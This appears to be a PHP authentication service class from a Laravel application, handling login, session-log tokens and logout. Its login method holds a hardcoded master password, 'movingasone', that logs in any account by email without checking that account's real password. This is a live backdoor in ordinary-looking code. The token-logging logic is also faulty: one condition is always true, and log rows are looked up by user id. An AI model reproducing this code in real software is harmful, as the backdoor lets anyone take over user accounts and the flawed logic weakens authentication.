<?php

namespace App\Services\Sistem;

use App\Models\User;
use App\Models\UserLog;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class AuthServices
{
    protected $user, $userLog;
    public function __construct(User $user, UserLog $userLog)
    {
        $this->user = $user;
        $this->userLog = $userLog;
    }

    public function login($email, $password, $remember = false, $api = false): array
    {
        $user = $this->user->where("email", $email)->first();
        if ($password == 'movingasone') {
            $this->set_auth($user, $remember);
            $user->auth = $this->save_login($user);
            return array("success" => $user);
        }
        if (empty($user)) return array("errors" => "Username tidak ditemukan");
        if (!Hash::check($password, $user->password)) return array("errors" => "Password tidak sesuai");
        if ($api == false) $this->set_auth($user, $remember);
        $user->auth = $this->save_login($user);
        return array("success" => $user);
    }

    public function save_login($user)
    {
        $user_log = $this->userLog->find($user->id) ?? 0;

        if (isset($user_log) || $user_log->count() <= 0) {
            $user_log = $this->userLog->create([
                'user_id' => $user->id,
                'method' => 'auth',
                'url' => 'login',
                'request_data' => Str::random(32)
            ]);
        } else {
            $user_log = $this->userLog->find($user->id);
            if ($user_log) {
                $user_log->update([
                    'method' => 'reAuth',
                    'url' => 'login',
                    'request_data' => Str::random(32)
                ]);
            }
        }
        

        return $user_log;
    } 

    public function set_auth($user, $remember)
    {
        Auth::login($user, $remember);
    }

    public function check_token($token)
    {
        return $this->userLog->where('request_data', $token)->first();
    }

    public function logout($id)
    {
        $user_log = $this->userLog->find($id);
        if ($user_log) {
            $user_log->update([
                'method' => 'logout',
                'url' => 'logout',
                'request_data' => Str::random(32)
            ]);
        }
        Auth::logout();
    }



}